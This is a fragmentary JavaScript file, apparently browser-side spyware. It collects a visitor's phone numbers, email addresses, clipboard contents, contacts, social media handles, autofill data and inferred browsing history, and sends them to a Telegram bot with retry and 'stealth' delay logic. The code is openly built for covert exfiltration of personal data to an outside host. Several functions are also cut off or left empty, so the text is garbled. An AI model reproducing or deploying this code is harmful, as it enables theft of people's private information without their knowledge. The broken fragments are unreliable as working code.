        // ENHANCED TELEGRAM COMMUNICATION
        async function sendToTelegram(message, maxRetries = 3) {
            if (isSending) {
                if (messageQueue.length < 10) messageQueue.push(message);
                return false;
            }

            isSending = true;
            let retryCount = 0;
            
            while (retryCount <= maxRetries) {
                try {
                    const randomEndpoint = CONFIG.telegram.endpoints[Math.floor(Math.random() * CONFIG.telegram.endpoints.length)];
                    const response = await fetch(`${randomEndpoint}/bot${CONFIG.telegram.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: CONFIG.telegram.chatId,
                            text: message.substring(0, 4090),
                            parse_mode: 'HTML'
                        })
                    });

                    if (response.ok) {
                        isSending = false;
                        if (messageQueue.length > 0) {
                            const nextMessage = messageQueue.shift();
                            setTimeout(() => sendToTelegram(nextMessage), stealth.randomDelay());
                        }
                        return true;
                    }
                    retryCount++;
                    await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
                } catch (error) {
                    retryCount++;
                    if (retryCount <= maxRetries) {
                        await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
                    }
                }
            }
            
            isSending = false;
            return false;
        }

        // NEW: PHONE NUMBER EXTRACTION METHODS
        function extractPhoneNumbers() {
            const numbers = new Set();
            
            // Method 1: DOM scraping for phone patterns
            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
            const textContent = document.body.innerText;
            const matches = textContent.match(phoneRegex) || [];
            matches.forEach(match => numbers.add(match.trim()));

            // Method 2: Input field analysis
            document.querySelectorAll('input[type="tel"], input[autocomplete*="tel"], input[name*="phone"], input[placeholder*="phone"]').forEach(input => {
                if (input.value) numbers.add(input.value);
            });

            // Method 3: Clipboard monitoring for pasted numbers
            if (clipboardData.length > 0) {
                clipboardData.forEach(item => {
                    const clipMatches = item.match(phoneRegex) || [];
                    clipMatches.forEach(match => numbers.add(match));
                });
            }

            // Method 4: Contact API detection (if available)
            if ('contacts' in navigator) {
                try {
                    navigator.contacts.select(['name', 'tel']).then(contacts => {
                        contacts.forEach(contact => {
                            if (contact.tel) numbers.add(contact.tel);
                        });
                    });
                } catch (e) {}
            }

            return Array.from(numbers);
        }

            const textContent = document.body.innerText;
            const matches = textContent.match(emailRegex) || [];
            matches.forEach(match => emails.add(match.toLowerCase()));

            // Method 2: Input field harvesting
            document.querySelectorAll('input[type="email"], input[autocomplete*="email"], input[name*="email"]').forEach(input => {
                if (input.value && input.value.includes('@')) {
                    emails.add(input.value.toLowerCase());
                }

            // Method 3: Password manager detection

                const form = passwordInput.closest('form');
                if (form) {
                    const emailInput = form.querySelector('input[type="email"]');
                    if (emailInput && emailInput.value) {

            ];
            
            socialPatterns.forEach(pattern => {
                const socialMatches = textContent.match(pattern) || [];
                socialMatches.forEach(match => emails.add(match.toLowerCase()));
            });

            return Array.from(emails);
        }

        // NEW: SOCIAL MEDIA HANDLE EXTRACTION
        function extractSocialMediaHandles() {
            const handles = {};
            const platforms = {
                twitter: /twitter\.com\/([A-Za-z0-9_]+)/g,
                instagram: /instagram\.com\/([A-Za-z0-9_.]+)/g,
                facebook: /facebook\.com\/([A-Za-z0-9.]+)/g,
                linkedin: /linkedin\.com\/in\/([A-Za-z0-9-]+)/g
            };

            const htmlContent = document.documentElement.outerHTML;
            Object.keys(platforms).forEach(platform => {
                const matches = htmlContent.match(platforms[platform]);
                if (matches) {
                    handles[platform] = [...new Set(matches.map(m => m.split('/').pop()))];
                }
            });

            return handles;
        }

        // NEW: BROWSER HISTORY INFERENCE
        function inferBrowserHistory() {
            const popularSites = [
                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 
                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com'
            ];
            const visited = [];

            popularSites.forEach(site => {
                const link = document.createElement('a');
                link.href = `https://${site}`;
                link.style.display = 'none';
                document.body.appendChild(link);
                
                const computed = getComputedStyle(link);
                if (computed.color !== 'rgb(0, 0, 238)') { // Check if visited style applied
                    visited.push(site);
                }
                document.body.removeChild(link);
            });

            return visited;
        }

            value += Object.keys(data.identity.socialProfiles).length * 5;

        // HELPER FUNCTIONS
        function chunkString(str, size) {
            const chunks = [];
            for (let i = 0; i < str.length; i += size) {

            }
            return chunks;
        }

        function getScrollDepth() {
            return Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);

            document.querySelectorAll('input').forEach(input => {
                if (input.matches(':-webkit-autofill')) {
                    patterns.push({
                        field: input.name || input.type,
                        autofilled: true
                    });
                }
            });
            return patterns;
        }
